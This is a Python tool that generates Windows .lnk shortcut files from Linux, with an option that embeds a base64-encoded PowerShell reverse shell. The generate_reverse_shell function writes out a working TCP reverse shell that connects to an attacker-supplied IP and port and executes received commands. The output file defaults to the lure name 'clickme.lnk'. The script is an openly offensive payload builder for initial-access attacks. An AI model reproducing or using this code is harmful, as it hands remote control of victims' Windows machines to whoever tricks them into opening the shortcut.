#!/usr/bin/python3
import sys
import argparse
import os
import subprocess
import readline
from pathlib import Path

# Importer notre générateur natif
from native_lnk_generator import create_powershell_lnk, create_powershell_lnk_simple, NativeLnkGenerator

# Banner function removed - no longer needed

def generate_reverse_shell(ip, port):
    """Generate base64 encoded PowerShell reverse shell"""
    import base64
    
    # PowerShell reverse shell payload
    powershell_payload = f'''$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
    
    # Encode to UTF-16LE then base64
    utf16le_bytes = powershell_payload.encode('utf-16le')
    base64_encoded = base64.b64encode(utf16le_bytes).decode('ascii')
    
    return f"powershell -e {base64_encoded}"

def get_command_interactive():
    """Interactive mode to get the command"""
    print("\nInteractive mode - Command input")
    print("Command examples:")
    print("  • ping 192.168.1.1 -n 3")
    print("  • calc.exe")
    print("  • cmd /c dir")
    print("  • notepad.exe C:\\temp\\file.txt")
    print("  • Get-Process (PowerShell)")
    
    while True:
        command = input("\nEnter your command: ").strip()
        if command:
            return command
        print("[-] Command cannot be empty. Please try again.")

def get_output_filename_interactive(default="clickme.lnk"):
    """Interactive mode to get the output filename"""
    print(f"\nOutput filename (default: {default})")
    filename = input(f"Filename [Enter for '{default}']: ").strip()
    
    if not filename:
        filename = default
    
    if not filename.endswith('.lnk'):
        filename += '.lnk'
    
    return filename



def choose_icon_interactive():
    """Interactive mode to choose icon - REMOVED"""
    pass

def get_description_interactive():
    """Interactive mode to get the description"""
    print("\nShortcut description (optional):")
    description = input("Description [Enter to skip]: ").strip()
    return description

def choose_target_type():
    """Choose the target type"""
    print("\nShortcut type:")
    print("  1. PowerShell (recommended)")
    print("  2. CMD")
    print("  3. Custom executable")
    
    while True:
        choice = input("Choose type [1-3, default: 1]: ").strip()
        if choice == "2":
            return "cmd"
        elif choice == "3":
            return "custom"
        elif choice == "1" or choice == "":
            return "powershell"
        print("[-] Invalid choice. Enter 1, 2 or 3.")

def generate_lnk_native(command, output_filename, icon_path=None, description="", target_type="powershell", verbose=False):
    """Generate the .lnk file with the native generator"""
    if verbose:
        print(f"\n[*] Generating .lnk file...")
        print(f"    Command: {command}")
        print(f"    Output: {output_filename}")
        print(f"    Type: {target_type.upper()}")
    
    try:
        if target_type == "powershell":
            # Utiliser la version simplifiée basée sur le template pour compatibilité maximale
            create_powershell_lnk_simple(
                target_command=command,
                output_path=output_filename,
                description=description
            )
        else:
            # Utiliser le générateur complet pour CMD ou exécutable personnalisé
            generator = NativeLnkGenerator()
            
            if target_type == "cmd":
                target_path = "C:\\Windows\\System32\\cmd.exe"
                args = f'/c "{command}"'
            else:  # custom
                # Pour un exécutable personnalisé, la commande est le chemin
                target_path = command
                args = ""
            
            generator.set_target(target_path) \
                    .set_arguments(args) \
                    .set_working_directory("%CD%") \
                    .set_description(description or f"{target_type} shortcut") \
                    .set_show_command(NativeLnkGenerator.ShowCommand.SW_NORMAL)
            
            generator.generate(output_filename)
        
        if verbose:
            file_size = os.path.getsize(output_filename)
            print(f"[+] File generated: {output_filename}")
            print(f"[+] Size: {file_size} bytes")
            
            # Verification with file command if available
            try:
                result = subprocess.run(['file', output_filename], capture_output=True, text=True)
                if result.returncode == 0:
                    # Extract just the file type without all details
                    file_type = result.stdout.split(':')[1].split(',')[0].strip()
                    print(f"[+] Type: {file_type}")
            except:
                pass
        
    except Exception as e:
        raise RuntimeError(f"[-] Generation error: {str(e)}")

def main():
    parser = argparse.ArgumentParser(
        description=".lnk file generator - Create Windows shortcuts from Linux",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Usage examples:
  %(prog)s                                    # Full interactive mode
  %(prog)s -c "ping 8.8.8.8"                 # Quick PowerShell
  %(prog)s -c "calc.exe" -o calculator.lnk   # Custom name
  %(prog)s -r 192.168.1.10 4444              # Generate reverse shell
  %(prog)s -r 10.0.0.1 9001 -o shell.lnk     # Reverse shell with custom name
  %(prog)s -c "dir" --type cmd                # Use CMD instead of PowerShell
  %(prog)s -c "C:\\\\app.exe" --type custom   # Custom executable
  %(prog)s --interactive                      # Force interactive mode

Advantages of this version:
  • Uses Windows template when available (maximum compatibility)
  • Pure native generation as fallback
  • Compatible with all Linux environments
  • Full control over .lnk structure
  • Authentic Windows metadata

Supported shortcut types:
  • PowerShell (default) - Ideal for commands
  • CMD - Legacy compatible
  • Executable - Direct to .exe

Note: Custom icon functionality has been removed
as it did not work reliably on Windows.
        """
    )
    
    parser.add_argument('-c', '--command', 
                       help='Command to inject into the shortcut')
    
    parser.add_argument('-r', '--reverse', nargs=2, metavar=('IP', 'PORT'),
                       help='Generate PowerShell reverse shell (IP PORT)')
    
    parser.add_argument('-o', '--output', 
                       default='clickme.lnk',
                       help='Output filename (default: clickme.lnk)')
    

    
    parser.add_argument('-i', '--interactive', 
                       action='store_true',
                       help='Force interactive mode')
    
    parser.add_argument('-v', '--verbose', 
                       action='store_true',
                       help='Verbose mode (show more details)')
    
    parser.add_argument('--desc', '--description',
                       help='Shortcut description')
    
    parser.add_argument('--type', 
                       choices=['powershell', 'cmd', 'custom'],
                       default='powershell',
                       help='Shortcut type (default: powershell)')
    
    args = parser.parse_args()
    
    # Validation: cannot use both -c and -r
    if args.command and args.reverse:
        print("[-] Error: Cannot use both -c/--command and -r/--reverse options together")
        sys.exit(1)
    
    try:
        # Banner removed - no longer displayed
        
        # Determine parameters
        if args.reverse:
            # Reverse shell mode
            ip, port = args.reverse
            command = generate_reverse_shell(ip, port)
            if args.verbose:
                print(f"[*] Generated reverse shell for {ip}:{port}")
        elif args.interactive or not args.command:
            # Interactive mode
            target_type = choose_target_type()
            command = get_command_interactive()
            
            if not args.command:  # If no command in arguments
                args.output = get_output_filename_interactive(args.output)
                if not args.desc:
                    args.desc = get_description_interactive()
            
            args.type = target_type
        else:
            command = args.command
        
        # Generate the .lnk file
        generate_lnk_native(
            command=command,
            output_filename=args.output,
            description=args.desc or "",
            target_type=args.type,
            verbose=args.verbose
        )
        
        # Basic messages (always displayed)
        print(f"[+] File created: {args.output}")
        
        # Detailed messages only in verbose mode
        if args.verbose:
            print(f"[+] Generation completed successfully.")
            print(f"[*] Transfer it to Windows to use")
            print(f"[*] Verification: xxd {args.output}")
    
    except KeyboardInterrupt:
        print("\n\n[-] Operation interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 